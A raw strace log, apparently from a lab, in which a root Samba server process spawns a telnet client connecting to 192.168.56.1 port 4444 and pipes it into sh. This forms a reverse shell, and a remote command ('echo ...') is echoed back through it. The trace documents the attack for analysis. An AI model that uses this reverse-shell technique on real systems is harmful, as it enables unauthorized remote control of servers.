+[pid  6370] 22:01:45.150402 <... ioctl resumed> , 0xbfaf8b78) = -1 ENOTTY (Inappropriate ioctl for device)
+[pid  6369] 22:01:45.150408 <... waitpid resumed> 0xbfd47328, WNOHANG) = -1 ECHILD (No child processes)
+[pid  6370] 22:01:45.150419 mmap2(NULL, 4096, PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_ANONYMOUS, -1, 0 <unfinished ...>
+[pid  6369] 22:01:45.150427 sigreturn( <unfinished ...>
+[pid  6370] 22:01:45.150455 <... mmap2 resumed> ) = 0xb7fbd000
+[pid  6369] 22:01:45.150460 <... sigreturn resumed> ) = ? (mask now [FPE USR2 PIPE])
+[pid  6370] 22:01:45.150485 close(-1 <unfinished ...>
+[pid  6369] 22:01:45.150492 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6370] 22:01:45.150502 <... close resumed> ) = -1 EBADF (Bad file descriptor)
+[pid  6369] 22:01:45.150507 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6370] 22:01:45.150526 socket(PF_INET, SOCK_STREAM, IPPROTO_IP <unfinished ...>
+[pid  6369] 22:01:45.150533 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE],  <unfinished ...>
+[pid  6370] 22:01:45.150548 <... socket resumed> ) = 3
+[pid  6369] 22:01:45.150553 <... rt_sigprocmask resumed> NULL, 8) = 0
+[pid  6370] 22:01:45.150567 setsockopt(3, SOL_IP, IP_TOS, [16], 4 <unfinished ...>
+[pid  6369] 22:01:45.150576 rt_sigprocmask(SIG_BLOCK, [CHLD],  <unfinished ...>
+[pid  6370] 22:01:45.150587 <... setsockopt resumed> ) = 0
+[pid  6369] 22:01:45.150592 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6370] 22:01:45.150607 connect(3, {sa_family=AF_INET, sin_port=htons(4444), sin_addr=inet_addr("192.168.56.1")}, 16 <unfinished ...>
+[pid  6369] 22:01:45.150621 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:45.150728 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+[pid  6369] 22:01:45.150757 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6369] 22:01:45.150771 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:45.150793 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.150809 read(0, "C", 1) = 1
+[pid  6369] 22:01:45.150824 read(0, "o", 1) = 1
+[pid  6369] 22:01:45.150835 read(0, "n", 1) = 1
+[pid  6369] 22:01:45.150847 read(0, "n", 1) = 1
+[pid  6369] 22:01:45.150858 read(0, "e", 1) = 1
+[pid  6369] 22:01:45.150870 read(0, "c", 1) = 1
+[pid  6370] 22:01:45.150876 <... connect resumed> ) = 0
+[pid  6369] 22:01:45.150876 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.150893 open("/etc/telnetrc", O_RDONLY <unfinished ...>
+[pid  6369] 22:01:45.150907 <... read resumed> "t", 1) = 1
+[pid  6370] 22:01:45.150928 <... open resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.150934 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.150950 open("(null)/.telnetrc", O_RDONLY <unfinished ...>
+[pid  6369] 22:01:45.150970 <... read resumed> "e", 1) = 1
+[pid  6370] 22:01:45.150979 <... open resumed> ) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.150984 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.150999 write(1, "Trying 192.168.56.1...\nConnected"..., 76 <unfinished ...>
+[pid  6369] 22:01:45.151013 <... read resumed> "d", 1) = 1
+[pid  6370] 22:01:45.151022 <... write resumed> ) = 76
+[pid  6369] 22:01:45.151027 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151036 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  6369] 22:01:45.151042 <... read resumed> " ", 1) = 1
+[pid  6370] 22:01:45.151050 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.151058 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151068 rt_sigaction(SIGINT, {0x804f550, [INT], SA_RESTART},  <unfinished ...>
+[pid  6369] 22:01:45.151080 <... read resumed> "t", 1) = 1
+[pid  6370] 22:01:45.151088 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:45.151098 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151106 rt_sigaction(SIGQUIT, {0x804f500, [QUIT], SA_RESTART},  <unfinished ...>
+[pid  6369] 22:01:45.151118 <... read resumed> "o", 1) = 1
+[pid  6370] 22:01:45.151126 <... rt_sigaction resumed> {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:45.151136 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151145 rt_sigaction(SIGWINCH, {0x804f4e0, [WINCH], SA_RESTART},  <unfinished ...>
+[pid  6369] 22:01:45.151156 <... read resumed> " ", 1) = 1
+[pid  6370] 22:01:45.151164 <... rt_sigaction resumed> {SIG_DFL}, 8) = 0
+[pid  6369] 22:01:45.151174 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151184 rt_sigaction(SIGTSTP, {0x8053270, [TSTP], SA_RESTART},  <unfinished ...>
+[pid  6369] 22:01:45.151195 <... read resumed> "1", 1) = 1
+[pid  6370] 22:01:45.151213 <... rt_sigaction resumed> {0x8053270, [TSTP], SA_RESTART}, 8) = 0
+[pid  6369] 22:01:45.151239 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151258 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
+[pid  6369] 22:01:45.151265 <... read resumed> "9", 1) = 1
+[pid  6370] 22:01:45.151273 <... ioctl resumed> , 0xbfaf9254) = -1 EINVAL (Invalid argument)
+[pid  6369] 22:01:45.151279 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151288 ioctl(0, SNDCTL_TMR_STOP or TCSETSW <unfinished ...>
+[pid  6369] 22:01:45.151294 <... read resumed> "2", 1) = 1
+[pid  6370] 22:01:45.151302 <... ioctl resumed> , {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+[pid  6369] 22:01:45.151326 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151335 ioctl(0, SNDCTL_TMR_TIMEBASE or TCGETS <unfinished ...>
+[pid  6369] 22:01:45.151341 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.151348 <... ioctl resumed> , 0xbfaf9254) = -1 EINVAL (Invalid argument)
+[pid  6369] 22:01:45.151354 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151362 ioctl(0, SNDCTL_TMR_START or TCSETS <unfinished ...>
+[pid  6369] 22:01:45.151368 <... read resumed> "1", 1) = 1
+[pid  6370] 22:01:45.151376 <... ioctl resumed> , {B0 opost isig icanon echo ...}) = -1 EINVAL (Invalid argument)
+[pid  6369] 22:01:45.151390 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151400 ioctl(0, FIONBIO <unfinished ...>
+[pid  6369] 22:01:45.151406 <... read resumed> "6", 1) = 1
+[pid  6370] 22:01:45.151414 <... ioctl resumed> , [1]) = 0
+[pid  6369] 22:01:45.151420 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151429 ioctl(1, FIONBIO <unfinished ...>
+[pid  6369] 22:01:45.151434 <... read resumed> "8", 1) = 1
+[pid  6370] 22:01:45.151442 <... ioctl resumed> , [1]) = 0
+[pid  6369] 22:01:45.151448 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151457 ioctl(3, FIONBIO <unfinished ...>
+[pid  6369] 22:01:45.151462 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.151471 <... ioctl resumed> , [1]) = 0
+[pid  6369] 22:01:45.151477 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151490 setsockopt(3, SOL_SOCKET, SO_OOBINLINE, [1], 4 <unfinished ...>
+[pid  6369] 22:01:45.151498 <... read resumed> "5", 1) = 1
+[pid  6370] 22:01:45.151507 <... setsockopt resumed> ) = 0
+[pid  6369] 22:01:45.151512 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151522 select(4, [0 3], [], [3], {0, 0} <unfinished ...>
+[pid  6369] 22:01:45.151535 <... read resumed> "6", 1) = 1
+[pid  6370] 22:01:45.151544 <... select resumed> ) = 1 (in [0], left {0, 0})
+[pid  6369] 22:01:45.151554 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.151564 read(0,  <unfinished ...>
+[pid  6369] 22:01:45.151569 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.188493 <... read resumed> "sh: line 1: Trying: command not "..., 8191) = 38
+[pid  6369] 22:01:45.188532 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.188540 select(4, [0 3], [3], [3], {0, 0} <unfinished ...>
+[pid  6369] 22:01:45.188560 <... read resumed> "1", 1) = 1
+[pid  6370] 22:01:45.188568 <... select resumed> ) = 1 (out [3], left {0, 0})
+[pid  6369] 22:01:45.188588 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.188599 send(3, "sh: line 1: Trying: command not "..., 39, 0 <unfinished ...>
+[pid  6369] 22:01:45.188628 <... read resumed> ".", 1) = 1
+[pid  6370] 22:01:45.188628 <... send resumed> ) = 39
+[pid  6369] 22:01:45.188663 read(0, "\n", 1) = 1
+[pid  6369] 22:01:45.188794 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6369] 22:01:45.188875 stat64("/sbin/Connected", 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.188919 stat64("/bin/Connected", 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.188949 stat64("/usr/sbin/Connected", 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.188978 stat64("/usr/bin/Connected", 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.189000 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.189019 clone(Process 6378 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d946f8) = 6378
+[pid  6378] 22:01:45.189100 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6378] 22:01:45.189121 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6378] 22:01:45.189142 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6378] 22:01:45.189161 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6378] 22:01:45.189187 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6378] 22:01:45.189213 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6378] 22:01:45.189233 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  6378] 22:01:45.189346 write(2, "sh: line 2: Connected: command n"..., 41) = 41
+[pid  6378] 22:01:45.189446 exit_group(127) = ?
+Process 6378 detached
+[pid  6370] 22:01:45.189484 select(4, [0 3], [], [3], {0, 0}) = 1 (in [0], left {0, 0})
+[pid  6370] 22:01:45.189506 read(0, "sh: line 2: Connected: command n"..., 8154) = 41
+[pid  6370] 22:01:45.189528 select(4, [0 3], [3], [3], {0, 0}) = 1 (out [3], left {0, 0})
+[pid  6370] 22:01:45.189553 send(3, "sh: line 2: Connected: command n"..., 42, 0) = 42
+[pid  6370] 22:01:45.189656 select(4, [0 3], [], [3], {0, 0}) = 0 (Timeout)
+[pid  6370] 22:01:45.189675 select(4, [0 3], [], [3], NULL <unfinished ...>
+[pid  6369] 22:01:45.196229 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6369] 22:01:45.196375 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  6369] 22:01:45.196433 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 6378
+[pid  6369] 22:01:45.196475 waitpid(-1, 0xbfd47328, WNOHANG) = -1 ECHILD (No child processes)
+[pid  6369] 22:01:45.196494 sigreturn() = ? (mask now [FPE USR2 PIPE])
+[pid  6369] 22:01:45.196534 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.196551 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6369] 22:01:45.196565 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.196581 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:45.196602 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+[pid  6369] 22:01:45.196634 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6369] 22:01:45.196648 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:45.196672 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.196688 read(0, "E", 1) = 1
+[pid  6369] 22:01:45.196717 read(0, "s", 1) = 1
+[pid  6369] 22:01:45.196738 read(0, "c", 1) = 1
+[pid  6369] 22:01:45.196750 read(0, "a", 1) = 1
+[pid  6369] 22:01:45.196762 read(0, "p", 1) = 1
+[pid  6369] 22:01:45.196784 read(0, "e", 1) = 1
+[pid  6369] 22:01:45.196797 read(0, " ", 1) = 1
+[pid  6369] 22:01:45.196818 read(0, "c", 1) = 1
+[pid  6369] 22:01:45.196831 read(0, "h", 1) = 1
+[pid  6369] 22:01:45.196843 read(0, "a", 1) = 1
+[pid  6369] 22:01:45.196855 read(0, "r", 1) = 1
+[pid  6369] 22:01:45.196867 read(0, "a", 1) = 1
+[pid  6369] 22:01:45.196879 read(0, "c", 1) = 1
+[pid  6369] 22:01:45.196891 read(0, "t", 1) = 1
+[pid  6369] 22:01:45.196903 read(0, "e", 1) = 1
+[pid  6369] 22:01:45.196915 read(0, "r", 1) = 1
+[pid  6369] 22:01:45.196927 read(0, " ", 1) = 1
+[pid  6369] 22:01:45.196939 read(0, "i", 1) = 1
+[pid  6369] 22:01:45.196951 read(0, "s", 1) = 1
+[pid  6369] 22:01:45.196963 read(0, " ", 1) = 1
+[pid  6369] 22:01:45.196975 read(0, "\'", 1) = 1
+[pid  6369] 22:01:45.196987 read(0, "^", 1) = 1
+[pid  6369] 22:01:45.197010 read(0, "]", 1) = 1
+[pid  6369] 22:01:45.197031 read(0, "\'", 1) = 1
+[pid  6369] 22:01:45.197053 read(0, ".", 1) = 1
+[pid  6369] 22:01:45.197065 read(0, "\n", 1) = 1
+[pid  6369] 22:01:45.197103 stat64(".", {st_mode=S_IFDIR|0755, st_size=4096, ...}) = 0
+[pid  6369] 22:01:45.197141 stat64("/sbin/Escape", 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.197162 stat64("/bin/Escape", 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.197178 stat64("/usr/sbin/Escape", 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.197197 stat64("/usr/bin/Escape", 0xbfd476a8) = -1 ENOENT (No such file or directory)
+[pid  6369] 22:01:45.197216 rt_sigprocmask(SIG_BLOCK, [INT CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.197234 clone(Process 6379 attached
+child_stack=0, flags=CLONE_CHILD_CLEARTID|CLONE_CHILD_SETTID|SIGCHLD, child_tidptr=0xb7d946f8) = 6379
+[pid  6379] 22:01:45.197314 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6379] 22:01:45.197353 rt_sigaction(SIGTSTP, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6379] 22:01:45.197374 rt_sigaction(SIGTTIN, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6379] 22:01:45.197408 rt_sigaction(SIGTTOU, {SIG_DFL}, {SIG_DFL}, 8) = 0
+[pid  6379] 22:01:45.197446 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6379] 22:01:45.197489 rt_sigaction(SIGQUIT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6379] 22:01:45.197510 rt_sigaction(SIGCHLD, {SIG_DFL}, {0x807e540, [], 0}, 8) = 0
+[pid  6379] 22:01:45.197691 write(2, "sh: line 3: Escape: command not "..., 38 <unfinished ...>
+[pid  6370] 22:01:45.197738 <... select resumed> ) = 1 (in [0])
+[pid  6379] 22:01:45.197751 <... write resumed> ) = 38
+[pid  6370] 22:01:45.197764 read(0, "sh: line 3: Escape: command not "..., 8113) = 38
+[pid  6370] 22:01:45.197796 select(4, [0 3], [3], [3], {0, 0}) = 1 (out [3], left {0, 0})
+[pid  6370] 22:01:45.197836 send(3, "sh: line 3: Escape: command not "..., 39, 0) = 39
+[pid  6370] 22:01:45.197894 select(4, [0 3], [], [3], {0, 0}) = 0 (Timeout)
+[pid  6370] 22:01:45.197894 select(4, [0 3], [], [3], NULL <unfinished ...>
+[pid  6379] 22:01:45.197894 exit_group(127) = ?
+Process 6379 detached
+[pid  6369] 22:01:45.209841 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6369] 22:01:45.209994 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  6369] 22:01:45.210025 waitpid(-1, [{WIFEXITED(s) && WEXITSTATUS(s) == 127}], WNOHANG) = 6379
+[pid  6369] 22:01:45.210065 waitpid(-1, 0xbfd47328, WNOHANG) = -1 ECHILD (No child processes)
+[pid  6369] 22:01:45.210077 sigreturn() = ? (mask now [FPE USR2 PIPE])
+[pid  6369] 22:01:45.210129 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.210146 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6369] 22:01:45.210160 rt_sigprocmask(SIG_BLOCK, [CHLD], [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.210176 rt_sigaction(SIGINT, {0x807f150, [], 0}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:45.210197 rt_sigaction(SIGINT, {SIG_IGN}, {0x807f150, [], 0}, 8) = 0
+[pid  6369] 22:01:45.210219 rt_sigprocmask(SIG_SETMASK, [FPE USR2 PIPE], NULL, 8) = 0
+[pid  6369] 22:01:45.210233 rt_sigaction(SIGINT, {SIG_IGN}, {SIG_IGN}, 8) = 0
+[pid  6369] 22:01:45.210253 rt_sigprocmask(SIG_BLOCK, NULL, [FPE USR2 PIPE], 8) = 0
+[pid  6369] 22:01:45.230644 read(0,  <unfinished ...>
+[pid  6367] 22:01:45.402788 <... select resumed> ) = 1 (in [3])
+[pid  6370] 22:01:45.402906 <... select resumed> ) = 1 (in [3])
+[pid  6367] 22:01:45.402921 recv(3,  <unfinished ...>
+[pid  6370] 22:01:45.402952 recv(3,  <unfinished ...>
+[pid  6367] 22:01:45.402958 <... recv resumed> "echo TzzdKVB6jcixqU0N;\n", 8191, 0) = 23
+[pid  6370] 22:01:45.402980 <... recv resumed> "echo TzzdKVB6jcixqU0N;\n", 8191, 0) = 23
+[pid  6367] 22:01:45.402993 select(4, [0 3], [1], [3], {0, 0} <unfinished ...>
+[pid  6370] 22:01:45.403013 select(4, [0 3], [1], [3], {0, 0} <unfinished ...>
+[pid  6367] 22:01:45.403025 <... select resumed> ) = 1 (out [1], left {0, 0})
+[pid  6370] 22:01:45.403060 <... select resumed> ) = 1 (out [1], left {0, 0})
+[pid  6367] 22:01:45.403070 write(1, "echo TzzdKVB6jcixqU0N;\n", 23 <unfinished ...>
+[pid  6369] 22:01:45.403101 <... read resumed> "e", 1) = 1
+[pid  6370] 22:01:45.403109 write(1, "echo TzzdKVB6jcixqU0N;\n", 23 <unfinished ...>
+[pid  6367] 22:01:45.403121 <... write resumed> ) = 23
+[pid  6369] 22:01:45.403134 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.403149 <... write resumed> ) = 23
+[pid  6367] 22:01:45.403164 select(4, [0 3], [], [3], {0, 0} <unfinished ...>
+[pid  6369] 22:01:45.403180 <... read resumed> "c", 1) = 1
+[pid  6370] 22:01:45.403187 select(4, [0 3], [], [3], {0, 0} <unfinished ...>
+[pid  6367] 22:01:45.403198 <... select resumed> ) = 0 (Timeout)
+[pid  6369] 22:01:45.403207 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.403212 <... select resumed> ) = 0 (Timeout)
+[pid  6367] 22:01:45.403217 select(4, [0 3], [], [3], NULL <unfinished ...>
+[pid  6369] 22:01:45.403231 <... read resumed> "h", 1) = 1
+[pid  6370] 22:01:45.403238 select(4, [0 3], [], [3], NULL <unfinished ...>
+[pid  6369] 22:01:45.403250 read(0, "o", 1) = 1
+[pid  6369] 22:01:45.403262 read(0, " ", 1) = 1
+[pid  6369] 22:01:45.403274 read(0, "T", 1) = 1
+[pid  6369] 22:01:45.403286 read(0, "z", 1) = 1
+[pid  6369] 22:01:45.403297 read(0, "z", 1) = 1
+[pid  6369] 22:01:45.403309 read(0, "d", 1) = 1
+[pid  6369] 22:01:45.403321 read(0, "K", 1) = 1
+[pid  6369] 22:01:45.403343 read(0, "V", 1) = 1
+[pid  6369] 22:01:45.403364 read(0, "B", 1) = 1
+[pid  6369] 22:01:45.403375 read(0, "6", 1) = 1
+[pid  6369] 22:01:45.403387 read(0, "j", 1) = 1
+[pid  6369] 22:01:45.403399 read(0, "c", 1) = 1
+[pid  6369] 22:01:45.403410 read(0, "i", 1) = 1
+[pid  6369] 22:01:45.403422 read(0, "x", 1) = 1
+[pid  6369] 22:01:45.403434 read(0, "q", 1) = 1
+[pid  6369] 22:01:45.403445 read(0, "U", 1) = 1
+[pid  6369] 22:01:45.403457 read(0, "0", 1) = 1
+[pid  6369] 22:01:45.403469 read(0, "N", 1) = 1
+[pid  6369] 22:01:45.403480 read(0, ";", 1) = 1
+[pid  6369] 22:01:45.403492 read(0, "\n", 1) = 1
+[pid  6369] 22:01:45.403540 write(1, "TzzdKVB6jcixqU0N\n", 17 <unfinished ...>
+[pid  6370] 22:01:45.403555 <... select resumed> ) = 1 (in [0])
+[pid  6369] 22:01:45.403562 <... write resumed> ) = 17
+[pid  6370] 22:01:45.403575 read(0,  <unfinished ...>
+[pid  6369] 22:01:45.403581 rt_sigprocmask(SIG_BLOCK, NULL,  <unfinished ...>
+[pid  6370] 22:01:45.403590 <... read resumed> "TzzdKVB6jcixqU0N\n", 8075) = 17
+[pid  6369] 22:01:45.403600 <... rt_sigprocmask resumed> [FPE USR2 PIPE], 8) = 0
+[pid  6370] 22:01:45.403614 select(4, [0 3], [3], [3], {0, 0} <unfinished ...>
+[pid  6369] 22:01:45.403626 read(0,  <unfinished ...>
+[pid  6370] 22:01:45.403634 <... select resumed> ) = 1 (out [3], left {0, 0})
+[pid  6370] 22:01:45.403650 send(3, "TzzdKVB6jcixqU0N\r\n", 18, 0) = 18
+[pid  6370] 22:01:45.403723 select(4, [0 3], [], [3], {0, 0}) = 0 (Timeout)
+[pid  6370] 22:01:45.403742 select(4, [0 3], [], [3], NULL <unfinished ...>
+[pid  6361] 22:01:46.712770 <... select resumed> ) = 1 (in [5], left {58, 400000})
+[pid  6361] 22:01:46.712811 read(5, 0xb7fd6220, 4) = -1 ECONNRESET (Connection reset by peer)
+[pid  6361] 22:01:46.712836 time(NULL)  = 1478487706
+[pid  6361] 22:01:46.712856 stat64("/etc/localtime", {st_mode=S_IFREG|0644, st_size=3519, ...}) = 0
+[pid  6361] 22:01:46.712905 geteuid32() = 0
+[pid  6361] 22:01:46.712917 fstat64(27, {st_mode=S_IFREG|0644, st_size=0, ...}) = 0
+[pid  6361] 22:01:46.712959 write(27, "[2016/11/06 22:01:46, 0] lib/uti"..., 56) = 56
+[pid  6361] 22:01:46.713020 geteuid32() = 0
+[pid  6361] 22:01:46.713033 write(27, "  read_data: read failure for 4 "..., 95) = 95
+[pid  6361] 22:01:46.713062 munmap(0xb7896000, 696) = 0
+[pid  6361] 22:01:46.713079 close(16)   = 0
+[pid  6361] 22:01:46.713094 geteuid32() = 0
+[pid  6361] 22:01:46.713105 getegid32() = 0
+[pid  6361] 22:01:46.713116 setgroups32(0, []) = 0
+[pid  6361] 22:01:46.713130 setresgid32(-1, 0, -1) = 0
+[pid  6361] 22:01:46.713142 getegid32() = 0
+[pid  6361] 22:01:46.713153 setresuid32(0, 0, -1) = 0
+[pid  6361] 22:01:46.713164 geteuid32() = 0
+[pid  6361] 22:01:46.713184 fcntl64(11, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=212, len=1}, 0xbfa4dda4) = 0
+[pid  6361] 22:01:46.713207 fcntl64(11, F_SETLK64, {type=F_WRLCK, whence=SEEK_SET, start=1944, len=1}, 0xbfa4ddb4) = 0
+[pid  6361] 22:01:46.713226 fcntl64(11, F_SETLK64, {type=F_UNLCK, whence=SEEK_SET, start=1944, len=1}, 0xbfa4ddb4) = 0
+[pid  6361] 22:01:46.713245 fcntl64(11, F_SETLKW64, {type=F_WRLCK, whence=SEEK_SET, start=164, len=1}, 0xbfa4dd14) = 0
+[pid  6361] 22:01:46.713265 fcntl64(11, F_SETLKW64, {type=F_UNLCK, whence=SEEK_SET, start=164, len=1}, 0xbfa4dd24) = 0
+[pid  6361] 22:01:46.713284 fcntl64(11, F_SETLKW64, {type=F_UNLCK, whence=SEEK_SET, start=212, len=1}, 0xbfa4ddd4) = 0
+[pid  6361] 22:01:46.713304 time(NULL)  = 1478487706
+[pid  6361] 22:01:46.713316 select(26, [22 25], NULL, NULL, {0, 1000}) = 0 (Timeout)
+[pid  6361] 22:01:46.721737 munmap(0xb789d000, 696) = 0
+[pid  6361] 22:01:46.721752 close(12)   = 0
+[pid  6361] 22:01:46.721764 munmap(0xb789c000, 696) = 0
+[pid  6361] 22:01:46.721775 close(13)   = 0
+[pid  6361] 22:01:46.721786 munmap(0xb7899000, 696) = 0
+[pid  6361] 22:01:46.721810 close(14)   = 0
+[pid  6361] 22:01:46.722076 exit_group(0) = ?
+Process 6361 detached
+[pid  4409] 22:01:46.722186 <... select resumed> ) = ? ERESTARTNOHAND (To be restarted)
+[pid  4409] 22:01:46.722194 --- SIGCHLD (Child exited) @ 0 (0) ---
+[pid  4409] 22:01:46.722206 waitpid(-1, NULL, WNOHANG) = 6361
+[pid  4409] 22:01:46.722221 waitpid(-1, NULL, WNOHANG) = 0
+[pid  4409] 22:01:46.722231 sigreturn() = ? (mask now [FPE USR2 PIPE])
+[pid  4409] 22:01:46.722267 select(24, [21 22 23], NULL, NULL, NULL
